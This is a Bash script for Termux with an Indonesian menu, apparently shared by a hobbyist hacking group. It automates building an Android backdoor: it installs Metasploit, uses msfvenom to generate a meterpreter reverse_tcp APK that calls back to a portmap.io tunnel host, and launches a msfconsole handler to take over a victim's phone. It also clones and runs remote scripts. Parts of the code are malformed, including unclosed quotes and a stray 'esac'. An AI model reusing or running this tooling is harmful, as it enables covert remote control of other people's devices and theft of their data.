#!/bin/bash
#export os,sys
#flush ()
#variable warna
#gunakan script ini dengan bijak
#created by Konpoi
#github : https://github.com/duocyberteam
#thanks to : E99, Gafar Rizky & Fadilah Ramadhan

merah="\033[31;1m"
hijau="\033[32;1m"
kuning="\033[33;1m"
biru="\033[34;1m"
ungu="\033[35;1m"
cyngga="\033[36;1m"
putih="\033[37;1m"

clear

 cd $(pwd)

awal(){
echo $cyngga
baner
sleep 0.1
echo
echo $cyngga "----------------------------《 MENU 》---------------------------"
sleep 0.1
echo
echo $hijau"< 1 >$kuning INSTALL BAHAN BAHAN YANG DIPERLUKAN"
sleep 0.1
echo $hijau"< 2 >$kuning BUAT BACKDOOR BARU"
sleep 0.1
echo $hijau"< 3 >$kuning EKSEKUSI TARGET"
sleep 0.1
echo $hijau"< 4 >$kuning LOCK SECURITY APK TERMUK KALIAN"
sleep 0.1
echo $hijau"< 5 >$kuning UPDATE SCRIPT"
sleep 0.1
echo $hijau"< 6 >$kuning VIDEO TUTORIAL(YOUTUBE)"
sleep 0.1
echo $hijau"< 7 >$kuning EXIT"
sleep 0.1
echo
echo
read -p "MASUKAN PILIHAN  : " pi
}

baner(){
echo $hijau "
          ___ ___   _____ _____  __  _  __ __  __ __^
          |   T   T / ___/|     ||  l/ ]|  T  T|  T  T
          | _   _ |(   \_ |   __j|  ' / |  |  ||  |  |
          |  \_/  | \__  T|  l_  |    \ |  |  ||  ~  |
          |   |   | /  \ ||   _] |     Y|  :  |l___, |
          |   |   | \    ||  T   |  .  |l     ||     !
          l___j___j  \___jl__j   l__j\_j \__,_jl____/

          ___  _  _ ____    ____ _   _ ___  ____ ____
          |  \ |  | |  |    |     \_/  |__] |___ |__/
          |__/ |__| |__|    |___   |   |__] |___ |  \

                     ___ ____ ____ _  _
                      |  |___ |__| |\/|
                      |  |___ |  | |  |

$putih "_________________________________________________________________"

$cyngga   "Author"           ":"          $cyngga "" Konpoi (Duocyberteam) ""
$cyngga   "Github"           ":"           $cyngga "https://github.com/duocyberteam"
$cyngga   "Youtube"          ":"           $cyngga "Duocyberteam Metasploit"
$cyngga   "Thanks to"        ":"           $cyngga "Gafar Risky"

$putih "_________________________________________________________________"
"""
sleep 0.1
}

logo(){
echo $cyngga "
    __    __    ___  _      _         __   ___   ___ ___    ___
   |  T__T  T  /  _]| T    | T       /  ] /   \ |   T   T  /  _]
   |  |  |  | /  [_ | |    | |      /  / Y     Y| _   _ | /  [_
   |  |  |  |Y    _]| l___ | l___  /  /  |  O  ||  \_/  |Y    _]
   l  `  '  !|   [_ |     T|     T/   \_ |     ||   |   ||   [_
    \      / |     T|     ||     |\     |l     !|   |   ||     T
     \_/\_/  l_____jl_____jl_____j \____j \___/ l___j___jl_____j

                 ______   ___       ___ ___  __ __
                |      T /   \     |   T   T|  T  T
                |      |Y     Y    | _   _ ||  |  |
                l_j  l_j|  O  |    |  \_/  ||  ~  |
                  |  |  |     |    |   |   |l___, |
                  |  |  l     !    |   |   ||     !
                  l__j   \___/     l___j___jl____/

               _____    __  ____   ____  ____   ______
              / ___/   /  ]|    \ l    j|    \ |      T
             (   \_   /  / |  D  ) |  T |  o  )|      |
              \__  T /  /  |    /  |  | |   _/ l_j  l_j
              /  \ |/   \_ |    \  |  | |  |     |  |
              \    |\     ||  .  Y j  l |  |     |  |
               \___j \____jl__j\_j|____jl__j     l__j


                    $merah ""Code By KONPOI (Duocyberteam) ""
$hijau "______________________________________________________________________>
"""
}

login(){
logo
echo
echo $kuning "                        Hai, Selamat Datang!            "
echo
echo
sleep 0.1
echo "                     Harap LOGIN terlebih dahulu.. "
echo
sleep 0.1
echo "     Untuk memasuki Script.. Password ada di channel youtube saya"
echo
echo
echo
sleep 0.1
echo
echo
echo -n "Masukan NAMA ANDA : "
read username
sleep 0.1
echo
read -p "Masukan PASSWORD :  " pass
sleep 0.1
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
echo
}

loginfungsi(){
clear
login

if [ $pass = "buka1234" ];
then
echo $hijau "                                 LOGIN SUKSES     "
sleep 2
clear
logo
exit

else
echo
echo $cyngga "                         MAAF $username,PASSWORD SALAH !         >
echo $cyngga "             HARAP CEK YOUTUBE SAYA UNTUK MENGETAHUI PASSWORDNYA "
sleep 3
xdg-open https://youtu.be/Pxwi3xRpBsE

sleep 0.01
for i in ulang
do
      echo $loginfungsi
done
fungsi

fi
}

back(){
clear
fungsi
}

satu(){
clear
echo
baner
echo
echo $hijau"<1>$kuning INSTALL METASPLOIT "
sleep 0.1
echo $hijau"<2>$kuning INSTALL APKTOOL & LAINNYA "
sleep 0.1
echo
read -p "MASUKAN PILIHAN : " pil
echo
echo "input < $hijau back  > untuk ke menu awal"
}

msf_satu(){
echo
baner
echo
echo $cyngga "MEMERLUKAN WAKTU 30 MENIT SAMPAI 1 JAM"
echo $cyngga "SIAPKAN KOPINYA BIAR NUNGGUNYA GA BOSEN ,HEHE"
echo $cyngga "INSTALLING......"
sleep 0.1
echo
pkg update && upgrade
pkg install unstable-repo
termux-setup-storage
apt update && upgrade
apt install metasploit
sleep 0.1
clear
fungsi
}

bahan_dua(){
clear
echo
baner
echo
echo $cyngga "PENGINSTALLAN APKTOOL......."
echo $cyngga "Installing....."
echo
termux-setup-storage
apt update && apt upgrade -y
apt install git nano curl python python2 php ruby toilet figlet openssh clang -y
apt install -f -y
gem install lolcat
mkdir Malware
dpkg -i apktool.deb
echo
echo "----------------------------------------------------";
echo $hijau"[+]$ku installing sukses"
echo
sleep 5
clear
read -p "[+] enter untuk membuat akun portmap.io" y
xdg-open https://portmap.io/
read -p "[+] tekan enter untuk install openvpn" y
xdg-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn
read -p "[+] tekan enter untuk install apksigner" y
xdg-open https://play.google.com/store/apps/details?id=com.haibison.apksigner
echo
clear
fungsi
}

ulang(){
ulang="s"
while [ $ulang = "s" ];
do
        sleep 0.02
done
}

dua(){
clear
echo
baner
echo
read -p "MASUKAN NAMA BACKDOOR :" nama
sleep 0.01
echo $ungu "_________________________________________________________"
echo
echo $cyngga "Masukan 5 digit angka portmap Kalian"
echo
echo $putih "testermetasploit-$hijau 46454$putih .portmap.io"
echo $cyngga "Contoh 5 digit angka saya (yg warna hijau)"
echo
read -p "Masukan 5 digit angka kalian : " lp
echo                                                                                    
echo $ungu "________________________________________________________"
echo
echo $putih "Masukan LHOST Kalian"
echo
echo $hijau "testermetasploit-46454.portmap.io"                                         
echo $cyngga "Contoh LHOST saya (teks diatas)"
echo
read -p "Masukan LHOST kalian : " lh
echo
clear
echo $hijau "MEMBUAT BACKDOOR .. PLEASE WAIT ...."
sleep 1
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o /sdcard/$nama.apk
sleep 0.1
am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity
sleep 0.1
clear
fungsi
}

tiga(){
clear
echo
baner
echo
echo $cyngga "HIDUPKAN OPEN VPN TERLEBIH DAHULU..."
am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity
ifconfig
echo                                                                            
read -p "Masukan Iptun0 nya : " tun0
sleep 0.01
echo
clear
echo                                                                                    
echo $kuning "---------------------------------------------------"
echo
echo $putih "testermetasploit-46454.portmap.io =>$hijau 8080"
echo $cyngga "Contoh LPORT saya (5 digit angka yg warna hijau)"
echo
read -p "Masukan LPORT kalian : " lport;
echo
echo $ungu "EKSEKUSI . WAITING......"
sleep 0.1
msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $tun0;set LPORT $lport;exploit;"
sleep 0.1
clear
fungsi
}

empat(){
clear
echo
baner
echo $hijau"<1> $kuning BUAT PASSWORD / RUBAH PASSWORD "
sleep 0.1
echo
echo $hijau"<2> $kuning TERAPKAN KUNCI PASSWORD APK TERMUK "
sleep 0.1
echo
read -p "Masukan Pilihan : " pul
}

buatpass(){
clear
echo
baner
echo
echo $cyngga "HAL YANG HARUS DI LAKUKAN ."
echo
echo $cyngga "1. Klik CTRL+W lalu ketik buka1234.
echo $cyngga "2. Kalian akan di arahkan ke teks buka1234
echo $cyngga "3. Lalu kalian ganti teks buka1234 itu dgn password kalian"
echo $cyngga "4. Tanda petiknya jangan di hapus. Anda hapus teks buka1234 nya saja"
echo $cyngga "5. Jika sudah klik CTRL+X , lalu ketik y  ,kemudian enter"
echo $cyngga "6. Jika sudah masuk ke script saya lagi, dan lanjut ke tahap ke 2"
echo $cyngga "
echo $cyngga "Saya kasih waktu 15 detik untuk membaca dan memahaminya. "
echo $cyngga "Setelah ini anda akan di alihkan ke script lock. Dan lakukan perintah no 1-6"
sleep 15
cd
git clone https://github.com/konpoi/lock
sleep 0.1
cd lock
nano lock.sh
}

terapkanpass(){
clear
echo
baner
echo
echo $cyngga "HAL YG HARUS DILAKUKAN (2)."
echo
echo $cyngga "1. Setelah ini anda akan di alihkan ke bash.rc"
echo $cyngga "2. Di bash rc, anda ketik < sh lock.sh > . Ketik teksnya aja , yg < > gausah.
echo $cyngga "3. Ketik di kolom paling bawah. Enter dulu sampe 3 kali."
echo
echo $cyngga "Saya kasih waktu 8 detik untuk membaca dan memahaminya"
echo $cyngga "Setelah ini anda akan dialihkan ke bash.rc"
sleep 8
cd
cd lock
cp -f lock.sh /$HOME
cd
cd ../usr/etc
nano bash.bashrc
}

passfungsi(){
empat
echo
if [ $pul = "1" ];
then
clear
buatpass

elif [ $pul = "2" ];
then
clear
terapkanpass

elif [ $pull = "back" ];
then
clear
fungsi

else
echo $merah "                                        MASUKAN INPUT YANG BENAR !!! "
sleep 0.1
clear
passfungsi

fi
}

lima(){
clear
cd
rm -fr msfkuy
git clone http://github.com/duocyberteam/msfkuy
sleep 0.01
cd msfkuy
sh msfkuy.sh
echo
clear
}

enam(){
echo $kuning  "    SUBSCRIBE , LIKE , COMENT . BANTU SUPPORT YAA    "
sleep 2
xdg-open https://m.youtube.com/channel/UCD7oBtHBe7bbGi31BZwe0ZA
clear
fungsi 
}

tujuh(){
baner
sleep 0.01
echo
echo
echo $hijau    "                TERIMAKASIH :)          "
echo
echo
echo $kuning "       Code By Konpoi (Duocyberteam) "
sleep 3
echo
cd  $(pwd)
cd
exit
}

satusatu(){
satu
echo
if [ $pil = "1" ];
then
clear                                                                                  
msf_satu

elif [ $pil = "2" ];
then
clear
bahan_dua

elif [ $pil = "back" ];
then
clear
fungsi

else
clear
echo $merah "MASUKAN INPUT YANG BENAR !"
sleep 2
clear
satusatu

fi
}

fungsi(){
loginfungsi
awal
if [ $pi = "1" ];
then
satusatu

elif [ $pi = "2" ];
then
clear
dua

elif [ $pi = "3" ];
then
clear
tiga

elif [ $pi = "4" ];
then
clear
empat

elif [ $pi = "5" ];
then
clear
lima

elif [ $pi = "6" ];
then
clear
enam

elif [ $pi = "7" ];
then
clear
tujuh

else
clear
echo $merah "MASUKAN INPUT YANG BENAR !"
sleep 3
clear
for i in ulang
do
      echo $fungsi
done
fungsi

fi
}

(fungsi)
;;
esac
